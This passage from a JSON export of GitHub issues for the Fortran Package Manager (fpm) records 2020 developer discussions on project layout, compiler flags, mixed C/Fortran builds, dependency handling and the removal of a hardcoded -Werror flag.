                    "date": "2020-05-13 17:24:18+00:00",
                    "text": "The low hanging fruit here seems to be handling the mixed C and Fortran source in a single project.\nJust let .c and .h sit in src/ by default, use gcc by default (like we do now with gfortran), link all object files into a static library and executable (like we do now).\nLinking to external (binary) dependencies seems orthogonal to this. Nevertheless important, but we could tackle these incrementally."
                },
                {
                    "user": "pdebuyl",
                    "date": "2020-05-13 20:47:04+00:00",
                    "text": "I had in mind the \"simple\" use case of one or a few c files that indeed \"just get compiled\" as part of the Fortran module. Making the shared C libraries available to other Fortran \"consumer code\" is probably out of scope. Anyway, thank you for the replies :-)"
                },
                {
                    "user": "certik",
                    "date": "2020-05-13 21:40:36+00:00",
                    "text": "@pdebuyl thanks for bringing it up, I think we can do that. Looking at my own code here: https://github.com/certik/hfsolver/tree/master/src, I have .f90 files, .c and .h files and also .cpp files all in the src directory. So if fpm could eventually compile all that correctly, that would go a long way. The reason I have the C and C++ files are just to interface 3rd party libraries, typically there is no way around that, as one must write some simpler wrapper that is ready to be called from Fortran using the iso_c_binding interface.\nSo I like this."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:44:48+00:00",
                    "text": "The Fortran fpm version does support compiling C code and we can link against native libraries already. I'll close this issue as resolved for now."
                }
            ]
        },
        {
            "number": 67,
            "user": "everythingfunctional",
            "date": "2020-04-30 03:21:47+00:00",
            "title": "Add sections to PACKAGING.md on explicit fpm.toml and tests",
            "text": "Add a couple of sections to the PACKAGING.md file and some other minor fixes.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-04-30 15:41:51+00:00",
                    "text": "I played with fpm finally, and it works well. This is how I was imagining it would work. Obviously it is still a prototype, but a usable one. Thank you @everythingfunctional for putting all the effort there! I really appreciate it.\nI think we need a mailinglist, for a general discussion. @milancurcic how about we create a fortran-lang mailinglist and simply see how it goes? We can always close it if it does not work out."
                }
            ]
        },
        {
            "number": 66,
            "user": "LKedward",
            "date": "2020-04-29 15:12:24+00:00",
            "title": "Support multiple compilers side-by-side in build",
            "text": "Currently compiled binaries are placed in build/debug/ and build/release.\nWould it be possible to make this build path dependent on compiler (and maybe architecture)?\ne.g. build/gfortran-9.2.0-x86_64_debug/\nThis reason for this being that I like to build and test my projects on multiple compilers during development; separating the binary output paths allows incremental builds using multiple compilers and allows tests on each compiler to run simultaneously and without clean and rebuild.\nThis may be considered an 'ugly' directory structure, however since fpm handles all compiler/linker paths and offers the fpm run command, this has no effect on end-user experience.\nThe workflow for using a non-default compiler could then be along the lines of:\n$> export FC=ifort\n$> fpm run\n\nor\n$> FC=ifort fpm run\n\nor\n$> fpm run --compiler=ifort",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 15:51:56+00:00",
                    "text": "Yeah, this shouldn't be too difficult. Good idea."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:33:44+00:00",
                    "text": "This has been resolved with #255 in Fortran fpm and #220 in the Haskell version."
                }
            ]
        },
        {
            "number": 65,
            "user": "milancurcic",
            "date": "2020-04-29 14:45:54+00:00",
            "title": "How to build multiple programs?",
            "text": "Currently, FPM can build only one executable program, namely main.f90.\nHere's how Cargo does it:\n.\n\u251c\u2500\u2500 Cargo.lock\n\u251c\u2500\u2500 Cargo.toml\n\u251c\u2500\u2500 src/\n\u2502   \u251c\u2500\u2500 lib.rs\n\u2502   \u251c\u2500\u2500 main.rs\n\u2502   \u2514\u2500\u2500 bin/\n\u2502       \u251c\u2500\u2500 named-executable.rs\n\u2502       \u251c\u2500\u2500 another-executable.rs\n\u2502       \u2514\u2500\u2500 multi-file-executable/\n\u2502           \u251c\u2500\u2500 main.rs\n\u2502           \u2514\u2500\u2500 some_module.rs\n\u251c\u2500\u2500 benches/\n\u2502   \u251c\u2500\u2500 large-input.rs\n\u2502   \u2514\u2500\u2500 multi-file-bench/\n\u2502       \u251c\u2500\u2500 main.rs\n\u2502       \u2514\u2500\u2500 bench_module.rs\n\u251c\u2500\u2500 examples/\n\u2502   \u251c\u2500\u2500 simple.rs\n\u2502   \u2514\u2500\u2500 multi-file-example/\n\u2502       \u251c\u2500\u2500 main.rs\n\u2502       \u2514\u2500\u2500 ex_module.rs\n\u2514\u2500\u2500 tests/\n    \u251c\u2500\u2500 some-integration-tests.rs\n    \u2514\u2500\u2500 multi-file-test/\n        \u251c\u2500\u2500 main.rs\n        \u2514\u2500\u2500 test_module.rs\n\nSo, for Fortran, the main executable could be src/main.f90, and other executables could go in src/bin.\nI like this approach, and I am not married to this particular directory structure. I also like the structure that we have now, namely app/, src/, tests/.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 15:57:27+00:00",
                    "text": "Right now, if you want multiple executables you have to specify them manually. I'm open to enabling some auto-detection of multiple executables. I'll put together an outline of what that would look like."
                },
                {
                    "user": "certik",
                    "date": "2020-04-29 16:28:46+00:00",
                    "text": "I like the Cargo layout a lot. Brad, is there a reason to use app? I would switch to src/bin to be consistent with Cargo.\n\u2026\nOn Wed, Apr 29, 2020, at 8:46 AM, Milan Curcic wrote:\n\n\n Currently, FPM can build only one executable program, namely `main.f90`.\n\n Here's how Cargo\n <https://doc.rust-lang.org/cargo/guide/project-layout.html> does it:\n\n `.\n \u251c\u2500\u2500 Cargo.lock\n \u251c\u2500\u2500 Cargo.toml\n \u251c\u2500\u2500 src/\n \u2502   \u251c\u2500\u2500 lib.rs\n \u2502   \u251c\u2500\u2500 main.rs\n \u2502   \u2514\u2500\u2500 bin/\n \u2502       \u251c\u2500\u2500 named-executable.rs\n \u2502       \u251c\u2500\u2500 another-executable.rs\n \u2502       \u2514\u2500\u2500 multi-file-executable/\n \u2502           \u251c\u2500\u2500 main.rs\n \u2502           \u2514\u2500\u2500 some_module.rs\n \u251c\u2500\u2500 benches/\n \u2502   \u251c\u2500\u2500 large-input.rs\n \u2502   \u2514\u2500\u2500 multi-file-bench/\n \u2502       \u251c\u2500\u2500 main.rs\n \u2502       \u2514\u2500\u2500 bench_module.rs\n \u251c\u2500\u2500 examples/\n \u2502   \u251c\u2500\u2500 simple.rs\n \u2502   \u2514\u2500\u2500 multi-file-example/\n \u2502       \u251c\u2500\u2500 main.rs\n \u2502       \u2514\u2500\u2500 ex_module.rs\n \u2514\u2500\u2500 tests/\n     \u251c\u2500\u2500 some-integration-tests.rs\n     \u2514\u2500\u2500 multi-file-test/\n         \u251c\u2500\u2500 main.rs\n         \u2514\u2500\u2500 test_module.rs\n `\n So, for Fortran, the main executable could be `src/main.f90`, and other\n executables could go in `src/bin`.\n\n I like this approach, and I am not married to this particular directory\n structure. I also like the structure that we have now, namely `app/`,\n `src/`, `tests/`.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#65>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWEWB2SGOZD73V6TTXTRPA4TFANCNFSM4MTZD3CQ>."
                },
                {
                    "user": "LKedward",
                    "date": "2020-04-29 16:34:11+00:00",
                    "text": "I actually much prefer app to src/bin. In my mind a bin directory is for binary files only, not source code."
                },
                {
                    "user": "certik",
                    "date": "2020-04-29 16:54:16+00:00",
                    "text": "Ok. Well, let's at least evaluate the options how to structure the layout with pros / cons. Because once we pick one, it will be hard to change.\n\u2026\nOn Wed, Apr 29, 2020, at 10:34 AM, LKedward wrote:\n\n\n I actually much prefer `app` to `src/bin`. In my mind a `bin` directory\n is for binary files only, not source code.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#65 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWCPT6UMT3RKJ6WRDJ3RPBJJFANCNFSM4MTZD3CQ>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 17:28:53+00:00",
                    "text": "The app, src separation makes it much easier to determine what should be packaged up into the library, and what is just for use in executable(s). I also makes finding the executable(s) a bit simpler for the automatically detected case. If we switch to the src/bin approach I'll need to special case out of searching that directory when building the library."
                },
                {
                    "user": "certik",
                    "date": "2020-04-29 17:59:54+00:00",
                    "text": "I see, good point. Are we still doing src/main.f90 to mean an executable? If so, then you have to special case this anyway."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-29 18:13:31+00:00",
                    "text": "I think we should aim to minimize special cases in the UI, and implement accordingly. A good test for this is asking what design leads to the simplest user guide.\nFor example, if everything in src is considered a library component except src/main.f90 and src/bin/*.f90, then these are special cases that require additional clauses in the documentation.\nOn the other hand, app for programs and src for library is simplest to explain to a user, and is currently my favorite solution.\nAn even simpler UI than this (to explain to a user) is to have program files be programs, and module files be modules, regardless of where they are in the tree. However this complicates implementation because now fpm needs to parse the sources. A downside is that now there may not be clear separation between programs and module files if the user is just looking at the source tree. However if you have app and src, it's clear.\nWe should study Rust+Cargo model in detail, but we shouldn't assume that it's the optimal solution for us. This could be because of Rust's own history of the project, or because Rust and Fortran are different languages and have different cultures.\nI agree with @LKedward about app vs bin."
                },
                {
                    "user": "certik",
                    "date": "2020-04-29 18:27:07+00:00",
                    "text": "Good points. Note that fpm has to parse the sources anyway to determine module dependencies and to enforce that each module name is named appropriately.\nSo looks like the most natural solution so far is:\n\nsrc contains module files (or loose procedures / function --- we should not encourage it, but some existing projects do that and I think we can incorporate this without harm). Everything in src gets built into a library.\napp, contains programs. Perhaps app/main.f90 could be the main program (by default executed by fpm run).\ntests contains tests\nbench contains benchmarks (we can do this one later perhaps --- although most of my projects contain some kind of benchmarks which are distinct from apps and distinct from tests)"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 21:41:54+00:00",
                    "text": "I see, good point. Are we still doing src/main.f90 to mean an executable? If so, then you have to special case this anyway.\n\nNo, I didn't implement src/main.f90 to be an executable. If it sees that it will expect it to be a module named main."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-28 10:24:55+00:00",
                    "text": "Closing as this is now implemented."
                }
            ]
        },
        {
            "number": 64,
            "user": "milancurcic",
            "date": "2020-04-29 14:38:17+00:00",
            "title": "fpm run and fpm test should emit a message if no action is taken",
            "text": "Currently, if you issue fpm run in a library project without executable program, it does nothing.\nIt'd be more user friendly if we emitted a message to stderr, something like:\nfpm: This package has no executable programs.\n\nor similar.\nLikewise for fpm test. If there are no test, we should say something like:\nfpm: This package has no tests.\n\nWhat do you think?",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 14:39:43+00:00",
                    "text": "Not a bad idea. Shouldn't be too difficult to implement."
                }
            ]
        },
        {
            "number": 63,
            "user": "milancurcic",
            "date": "2020-04-29 14:34:01+00:00",
            "title": "Don't require compiler field in fpm.toml",
            "text": "Following up on the discussion in #60, let's remove the requirement for the compiler setting in the package-specific fpm.toml.\nFor now, FPM should default to gfortran, and we can put a note in the README or the packaging guide that gfortran is currently the only compiler supported. We can relax this at a later time. The compiler setting can still remain in the toml parser as optional--perhaps we will want to allow package-specific choice of compiler.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 14:41:04+00:00",
                    "text": "That's reasonable for now. I'll make that change on my PR"
                }
            ]
        },
        {
            "number": 62,
            "user": "everythingfunctional",
            "date": "2020-04-29 02:55:30+00:00",
            "title": "Handling Dependencies",
            "text": "My basic outline of how to do this is the following recursive algorithm:\n\nfor each listed dependency, download/check it out\nGo into the dependency's fpm.toml file and for each of it's dependencies\na. if it's already been downloaded, check that it's version is compatible, otherwise recursively repeat this process\nCollect each of the dependencies dependencies,\nReturn the tree of dependencies\nBuild each of the dependencies, recursively building each of it's dependencies first",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 02:58:57+00:00",
                    "text": "I should be able to implement this soon. I'll use a similar toml specification style as Rust's cargo. I got sidetracked implementing the ability to parse that properly for the toml parser we're using.\nWhich brings up a question. Do we specify the specific git version of that library as one of our dependencies, or do we include the functions I implemented directly in our source? For either, at some point we'll be able to remove it and go back to using the library as normal."
                },
                {
                    "user": "LKedward",
                    "date": "2020-04-29 08:17:58+00:00",
                    "text": "Thanks @everythingfunctional, this will be great to get working! I have a few questions:\n\nAt this stage are dependencies simply specified directly as git repository urls (#33 decentralized package management)?\nAre you using git tags to track specific versions in git repositories?\nHow are dependency versions specified in fpm.toml? (cargo supports several version operators)\nAre you adopting some form of semantic versioning rules to resolve version compatibility?\n\nAlso: surely you can only resolve compatible dependency versions after the entire dependency tree has been constructed?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 14:30:29+00:00",
                    "text": "For now, we'll just support git repository urls, since we don't have a centralized repo yet.\nJust like cargo does, we'll support tags, commits, or branches being specified for a git dependency.\nI'm planning to implement version specifications exactly like cargo does. That's a bit longer term goal though.\nYes, we'll adopt semantic versioning rules. Long term, it may even be possible to enforce those rules in a centralized repository.\nIn the short term, we won't \"resolve\" dependency versions. It will just check if the version already downloaded is compatible with the package's requirements. If not we'll just throw an error. You can then \"resolve\" the conflict by specifying a version that works for all the dependencies in your package. I don't know of any package manager that has really and truly solved the version compatibility search problem. Many have just reasonable approximations or workarounds."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-28 10:24:11+00:00",
                    "text": "Closing as implemented in both versions of fpm."
                }
            ]
        },
        {
            "number": 61,
            "user": "milancurcic",
            "date": "2020-04-28 20:52:11+00:00",
            "title": "add license",
            "text": "FPM needs a license.\nMIT seems a no-brainer here, but need permission from contributors.",
            "comments": []
        },
        {
            "number": 60,
            "user": "milancurcic",
            "date": "2020-04-28 20:47:08+00:00",
            "title": "Package layout guide",
            "text": "First stab at describing package layout and examples.\nI took the user guide approach rather than a specification document because:\n\nIt's impossible to separate package layout specification (output of tree) and fpm.toml specification; they are interdependent;\nIt's impossible to predict the exact specification that we'll need; in other words, we need to work up to it;\nBy writing this out as a user guide, I had to learn it enough to teach it. This process illustrates what's missing and what's working or not working. We should take it step by step from there.\nWe want users to try to adapt their package to FPM and open issues with what doesn't work or is unclear.\n\nPlease read it and let me know any suggestions, or edit the document directly.\nYou'll see that I asked one question and proposed two issue candidates in quotation blocks (>). We should remove them and open issues before merging this.\nEverything covered in the guide works with current master of FPM, except a few details about fpm.toml settings that aren't implemented.\nI also need to say, even at this early and raw stage it's pleasure using FPM. Doing something like this with Fortran code is already pushing the boundary. So, great work @everythingfunctional and @certik.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-04-28 21:06:59+00:00",
                    "text": "Thanks @milancurcic for writing a tutorial for this. Very helpful. It looks great overall and I don't have any issues with it, except one big one: I strongly feel we should not be encoding compiler options into fpm.toml and so we should not be encouraging users to do so. In the same way, we should not be encoding standard layout into fpm.toml either. FPM should allow both as an option, but by default it would do the right thing.\nSo in particular, none of this should be there:\ncompiler = \"gfortran\"\ndevel-options = [\"-g\", \"-Wall\", \"-Wextra\", \"-pedantic\"]\nrelease-options = [\"-O3\"]\n\n[executables.executable-name]\nmain = \"main.f90\"\nsource-dirs = \"app\"\nlinker-options = [\"-O3\"]\n\nThis should be all inferred automatically. Exactly as Cargo works.\nI think fpm might not be able to do it yet. That is fine, but in that case I would like to see very clearly stated that this is temporary and show how the fpm.toml will look like once we implement this."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-28 21:31:39+00:00",
                    "text": "@certik I agree. What I think makes most sense is:\n\nfpm has default behavior baked in\n(optional) compiler can be changed on fpm level (not the package level)\n(optional) some packages may need to override default compiler flags, but I assume this is minority of packages.\n\nIt turns out, right now fpm doesn't require any of this except compiler. So even for the last example, this is a valid fpm.toml:\nname = \"math_constants\"\nversion = \"0.1.0\"\nlicense = \"MIT\"\nauthor = \"Jane Programmer\"\nmaintainer = \"jane@example.com\"\ncopyright = \"2020 Jane Programmer\"\ndependencies = []\ncompiler = \"gfortran\"\nSo I can go right ahead and remove the other settings from examples. That will also make the tutorial simpler.\nAs for the compiler setting, it seems like it would be straighforward for @everythingfunctional to hardcode it for now. I think that's a reasonable temporary solution."
                },
                {
                    "user": "certik",
                    "date": "2020-04-28 21:56:15+00:00",
                    "text": "fpm can optionally allow setting the compiler + options both at the package level (fpm.toml) as well as the fpm level (command line options / configure file such as ~/.fpmconfig).\nIdeally most packages will not specify either, just use the default as in your tutorial (I agree we should remove the gfortran that is currently still hardwired in fpm.toml even though clearly those examples would compile with any Fortran compiler). That way getting all packages working with a new compiler (say Flang or LFortran later on) would be trivial --- just add support for those compilers into fpm.\nOnly packages that truly require some special handling in compilers should do so --- and even then we should try to see what special handling they require. I've seen that some old f77 code requires the -std=legacy gfortran option. In that case I would suggest to not make them gfortran specific, but rather introduce a legacy=true fpm option (or in this case std=f77, std=f2018, ...), that would (in principle) work with any Fortran compiler and fpm would figure out what options must be set for each compiler."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 02:16:23+00:00",
                    "text": "This looks really good. I haven't read all the way through it yet, but I did notice a few inconsistencies with how I actually finished implementing all the toml options. I suggest we go ahead and merge this though, and then I'll fix any inconsistencies on my branch before we merge it. I should be able to do that within the next few days.\nI'll note that while in my implementation the compiler flags are hard coded, the compiler actually isn't. I suspect in the short term we'll pick different hard coded flags based on the compiler specified, and long term we'll come up with a compiler agnostic way of specifying special flags needed for a given project."
                }
            ]
        },
        {
            "number": 59,
            "user": "milancurcic",
            "date": "2020-04-26 18:46:49+00:00",
            "title": "remove -Werror gfortran flag",
            "text": "Fixes #56",
            "comments": []
        },
        {
            "number": 58,
            "user": "milancurcic",
            "date": "2020-04-26 18:44:47+00:00",
            "title": "Update readme and executable name",
            "text": "This PR:\n\nUpdates install instructions in the README and adds instructions on how to use fpm.\nRenames FPM executable from fpm-exe to fpm.\n\nFixes #55",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-04-28 21:56:01+00:00",
                    "text": "@certik Does this look good? It's a simple PR."
                }
            ]
        },
        {
            "number": 57,
            "user": "milancurcic",
            "date": "2020-04-26 18:18:15+00:00",
            "title": "fpm assumes .mod has the same name as the source file",
            "text": "If I have a source file datetime.f90 that contains a module called datetime_module, then gfortran (and all other compilers I believe) output datetime_module.mod. However, fpm expects datetime.mod and can't find it.\nI believe the assumption about .mod filename comes from somewhere around here, however I don't have a solution right now.\nI think the safe assumption is that the .mod file will have the module name, for fpm will need to scan the source file to get this info.\nFurther, a source file can have multiple modules defined, and for each the compiler will emit one .mod file.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-26 21:06:21+00:00",
                    "text": "That assumption actually comes from here.\nThe reasoning is that we want the file name to match the module name, and the module name to include the path components of the file name. This was a basic structure to help with organizing modules that @certik and I came up with.\nThere are ways to just inspect the source files and figure out the module names and dependencies more flexibly, but for our initial implementation we wanted to keep things as simple as possible and try and encourage a common organizational convention.\nObviously this is something that should be added to the README. @certik , do you think you'll have time to write up our standard conventions in the README any time soon?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-26 21:27:04+00:00",
                    "text": "Specifically for datetime-fortran, that's fine. I'm happy to rename the source file so it can build with fpm.\nI also support encouraging the practice one module per source file, with file name matching the module.\nHowever, I think this may be quite limiting if fpm is to build existing packages. I don't know, but it's possible that there are many that have multiple modules per source file.\nThis made me think now: why would there be an expectation for a specific .mod file to be present? AFAIK, the compiler cares only about the include path and that the modules are there. It knows how to find the file in the include directory. So, this requirement by fpm seems artificial to me. Could it be removed so that fpm only checks for .o files? I think it's safe to assume that if .o file is created, that the .mod files have been created as well."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-26 21:28:26+00:00",
                    "text": "However, I think this may be quite limiting if fpm is to build existing packages. I don't know, but it's possible that there are many that have multiple modules per source file.\n\nRelated to this, I think more problematic is that this requirement would prevent fpm from building correct and modern Fortran code."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-27 04:22:28+00:00",
                    "text": "It's more about rebuilds. If you change a module and rebuild, then if the .mod file changes, you need to rebuild everything that depends on it."
                },
                {
                    "user": "certik",
                    "date": "2020-04-27 05:12:55+00:00",
                    "text": "Yes, the default layout restricts what can be done, and you want that. It's not meant as a replacement for cmake, which allows you to do anything, but you pay for it by maintaining a complex buildsystem. We want to rather create a convention, that would allow fpm to figure out everything by itself.\n\nFor existing packages we either have to adapt them, or we need to tell fpm extra information where things are.\n\u2026\nOn Sun, Apr 26, 2020, at 10:22 PM, Brad Richardson wrote:\n\n\n It's more about rebuilds. If you change a module and rebuild, then if\n the .mod file changes, you need to rebuild everything that depends on\n it.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#57 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWBXBCUBJJZTLO54K4LROUCBBANCNFSM4MRK6V2A>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-27 12:27:17+00:00",
                    "text": "Okay, sounds good. We can revisit if it shows to be an issue, I don't think it is right now.\nYes, it'd be good to discuss and write out requirements for packages. I don't remember seeing this specific one anywhere."
                },
                {
                    "user": "certik",
                    "date": "2020-04-27 15:58:24+00:00",
                    "text": "@milancurcic see #39."
                }
            ]
        },
        {
            "number": 56,
            "user": "milancurcic",
            "date": "2020-04-26 17:59:16+00:00",
            "title": "Correct code fails to build due to hardcoded -Werror",
            "text": "fpm is currently making gfortran fail on warning by hardcoding -Werror. Removing -Werror from fpm.toml doesn't change this behavior (I understand specifying flags via fpm.toml may not be implemented yet.\nHowever, in the meantime, we shouldn't use -Werror because it's making correct code to fail. For example:\n[milan@gary test_project_error]$ cat src/mylib.f90 \nreal :: a, b\na = 2.\nb = 2.\nprint *, a == b\nend\n[milan@gary test_project_error]$ cat fpm.toml \nname = \"package-name\"\nversion = \"0.1.0\"\nlicense = \"BSD3\"\nauthor = \"Author name here\"\nmaintainer = \"example@example.com\"\ncopyright = \"2020 Author name here\"\ndependencies = []\ncompiler = \"gfortran\"\ndevel-options = [\"-g\", \"-Wall\", \"-Wextra\", \"-pedantic\"]\nrelease-options = [\"-O3\"]\n\n[library]\nsource-dirs = \"src\"\n[milan@gary test_project_error]$ fpm build\n# gfortran (for build/debug/library/mylib.o build/debug/library/mylib.mod)\nsrc/mylib.f90:4:8:\n\n print *, a == b\n        1\nError: Equality comparison for REAL(4) at (1) [-Werror=compare-reals]\nf951: all warnings being treated as errors\nfpm-exe: Error when running Shake build system:\n  at want, called at src/Build.hs:188:11 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/package-name.a\n  at need, called at src/Build.hs:186:13 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/mylib.o\n  at &%>, called at src/Build.hs:166:11 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/mylib.o build/debug/library/mylib.mod\n  at cmd, called at src/Build.hs:179:19 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Raised the exception:\nDevelopment.Shake.cmd, system command failed\nCommand line: gfortran -c -Jbuild/debug/library -Wall -Wextra -Wimplicit-interface -Werror -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -o build/debug/library/mylib.o src/mylib.f90\nExit code: 1\nStderr:\nsrc/mylib.f90:4:8:\n\n print *, a == b\n        1\nError: Equality comparison for REAL(4) at (1) [-Werror=compare-reals]\nf951: all warnings being treated as errors\n\nWhat do you think?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-04-26 18:15:42+00:00",
                    "text": "I think Werror is not your friend and should not be used here; especially here where we cannot guarantee a specific compiler version.\nLatest gfortran actually produces spurious warnings for certain derived-type allocations so Werror would completely prevent you from producing a debug build.\n#50"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-26 21:15:52+00:00",
                    "text": "As I mentioned on the PR, I'm fine with removing the -Werror flag from the default list. But in this instance I will point out that comparison of reals really is a bad idea. Floating point math means that equality will almost surely never be true. For example, I'm pretty sure (1.0 / 3.0) == ((1.0 / 9.0) * 3.0) is false, when you really would expect it to be true."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-26 21:35:26+00:00",
                    "text": "In most cases, yes, and that's why there should be a warning for it. :)"
                }
            ]
        },
        {
            "number": 55,
            "user": "milancurcic",
            "date": "2020-04-25 17:52:58+00:00",
            "title": "stack build does not add fpm executable to path",
            "text": "First time running stack. On running stack build, it looks like the fpm executable is not installed in any working path. I expected it to be installed either somewhere under stack like pip does, or locally and then added to my path.\nFor example, I'm working in /home/milan/Work/fortran/fpm, fpm-exe is installed here: /home/milan/Work/fortran/fpm/.stack-work/install/x86_64-linux-tinfo6/68e6a00e61079ec9146947ae047a1ce619d26ace12c1e4cd5fd58ceb496743b0/8.6.5/bin\nso I had to add this to my PATH.\nIs this expected behavior? If not, is this an issue with stack or with fpm?\nfpm-exe should be called just fpm.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-26 17:20:18+00:00",
                    "text": "stack build is not supposed to install the executable. I'll have to try it, but I believe stack install will do what you are after. I think it typically will install it to $HOME/.local/bin."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-26 18:58:34+00:00",
                    "text": "Thanks, I tested stack install and it works."
                }
            ]
        },
        {
            "number": 54,
            "user": "everythingfunctional",
            "date": "2020-04-14 00:37:36+00:00",
            "title": "Additional testing",
            "text": "Set up and test some example projects",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-22 02:46:11+00:00",
                    "text": "I think this is now sufficient for any project, with no dependencies, on any platform. But please feel free to put it through the ringer and let me know if you find anything."
                },
                {
                    "user": "certik",
                    "date": "2020-04-22 03:54:13+00:00",
                    "text": "Thanks @everythingfunctional. I'll test it out soon. I was really busy with other things lately."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-26 19:00:58+00:00",
                    "text": "I just noticed this didn't make it to master yet. I will play with it. So far I worked only with current master."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-26 23:29:17+00:00",
                    "text": "@certik , do you want a chance to test it out, or should I go ahead and merge this?"
                }
            ]
        },
        {
            "number": 53,
            "user": "everythingfunctional",
            "date": "2020-04-11 22:45:31+00:00",
            "title": "Finish commands",
            "text": "Finish the required functionality for a project with no dependencies.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-12 05:15:52+00:00",
                    "text": "Yeah, we should test a variety of setups, with default settings, specified default settings, and non-default settings. I guess my next steps should be to come up those examples."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-13 02:47:40+00:00",
                    "text": "@milancurcic , absolutely."
                },
                {
                    "user": "certik",
                    "date": "2020-04-13 17:40:38+00:00",
                    "text": "Thanks @everythingfunctional for working on this. It's quite difficult for me to contribute to the Haskell code base, as I am still learning it, but I'll be able to greatly help with the test cases --- if you provide some initial tests, I'll submit PRs with more tests."
                }
            ]
        },
        {
            "number": 52,
            "user": "everythingfunctional",
            "date": "2020-04-11 21:46:12+00:00",
            "title": "Finish simple project settings",
            "text": "This finishes up all the necessary settings for a basic simple project",
            "comments": []
        },
        {
            "number": 51,
            "user": "everythingfunctional",
            "date": "2020-03-31 20:50:29+00:00",
            "title": "Two stage settings",
            "text": "This splits the settings for FPM into a two stage process and starts to make use of that for default behavior",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-31 20:53:18+00:00",
                    "text": "The architecture is starting to come together and look reasonable so far. No major changes should be needed from this point to support all 3 commands for a project with no dependencies. I think that will be my next step after this."
                },
                {
                    "user": "certik",
                    "date": "2020-04-04 16:19:42+00:00",
                    "text": "Yes, our goal should be that fpm packages work with all compilers by default. My experience is with larger Fortran codes that they typically work with a few particular compilers but not all, e.g., one of our codes works with Intel and NAG, but not gfortran. I don't know if it makes sense to allow fpm packages to restrict which compilers it works with. But for now I would simply allow all.\n\u2026\nOn Sat, Apr 4, 2020, at 9:33 AM, Milan Curcic wrote:\n\n\n ***@***.**** approved this pull request.\n\n \ud83d\udc4d\n\n Should the compiler choice (e.g. gfortran) be set in fpm.toml? It seems\n to me more appropriate to be a local fpm setting and not a package\n setting. It's okay here for now, just a note for later.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#51 (review)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWHLSETPQZ5T3WR6ILLRK5HNLANCNFSM4LX72EBA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-04 17:17:08+00:00",
                    "text": "My thought is that the fpm.toml doesn't specify which compilers a package works with, but which compiler is used by default when building that package on its own. When building a package as a dependency for another project I don't expect any settings to be taken from the fpm.toml file except where to find the source files, and what other dependencies are needed. Compiler, flags, any other relevant settings would be set by the parent project and be in effect for building all dependencies."
                }
            ]
        },
        {
            "number": 50,
            "user": "everythingfunctional",
            "date": "2020-03-30 15:20:37+00:00",
            "title": "Compiler flags",
            "text": "How should we organize/specify compiler flags?\nShould we only have two sets of compiler flags? devel-options and release-options, and they are used to build all dependencies and executables?\nAlso, should we come up with our own keywords for specifying the compiler options, and have a look up table to determine the correct flag for each compiler?",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-03-30 16:29:04+00:00",
